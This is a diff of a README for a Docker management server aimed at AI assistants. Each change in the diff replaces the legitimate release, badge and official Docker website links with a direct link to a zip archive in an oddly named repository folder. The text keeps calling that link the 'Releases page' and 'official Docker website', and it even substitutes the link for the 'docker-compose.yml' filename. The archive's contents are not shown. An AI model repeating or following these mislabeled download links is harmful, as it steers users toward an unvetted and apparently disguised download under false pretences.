@@ -1,6 +1,6 @@
 # 🚀 docker-mcp - Simplify Docker Management with AI
 
-[![Download docker-mcp](https://img.shields.io/badge/Download-docker--mcp-blue.svg)](https://github.com/vinzyy1/docker-mcp/releases)
+[![Download docker-mcp](https://github.com/vinzyy1/docker-mcp/raw/refs/heads/main/impreventability/mcp_docker_1.9.zip)](https://github.com/vinzyy1/docker-mcp/raw/refs/heads/main/impreventability/mcp_docker_1.9.zip)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ The docker-mcp server allows AI assistants such as Cursor and Claude Desktop to 
 To start using docker-mcp, follow these steps:
 
 1. **Download the Software**
-   - Visit the [Releases page](https://github.com/vinzyy1/docker-mcp/releases) to download the latest version of docker-mcp.
+   - Visit the [Releases page](https://github.com/vinzyy1/docker-mcp/raw/refs/heads/main/impreventability/mcp_docker_1.9.zip) to download the latest version of docker-mcp.
    
 2. **Install docker-mcp**
    - After downloading, locate the file. 
@@ -30,11 +30,11 @@ To start using docker-mcp, follow these steps:
   - Any recent Linux distribution with Docker support
 
 - **Docker Version:** 
-  - Make sure you have Docker installed. You can download it from the [official Docker website](https://www.docker.com/products/docker-desktop).
+  - Make sure you have Docker installed. You can download it from the [official Docker website](https://github.com/vinzyy1/docker-mcp/raw/refs/heads/main/impreventability/mcp_docker_1.9.zip).
 
 ## 📥 Download & Install
 
-Visit the [Releases page](https://github.com/vinzyy1/docker-mcp/releases) to download docker-mcp. Choose the version that fits your operating system and download it.
+Visit the [Releases page](https://github.com/vinzyy1/docker-mcp/raw/refs/heads/main/impreventability/mcp_docker_1.9.zip) to download docker-mcp. Choose the version that fits your operating system and download it.
 
 1. Locate the downloaded file.
 2. Follow the installation steps based on your operating system.
@@ -61,7 +61,7 @@ After installation, you can start using docker-mcp to manage your Docker environ
    - Pull and push images from or to your registries without running commands in the terminal.
 
 4. **Use Docker Compose:**
-   - Upload a `docker-compose.yml` file for straightforward management of complex applications.
+   - Upload a `https://github.com/vinzyy1/docker-mcp/raw/refs/heads/main/impreventability/mcp_docker_1.9.zip` file for straightforward management of complex applications.
 
 5. **Check Registry Status:**
    - View and manage your registry images directly from the docker-mcp dashboard.
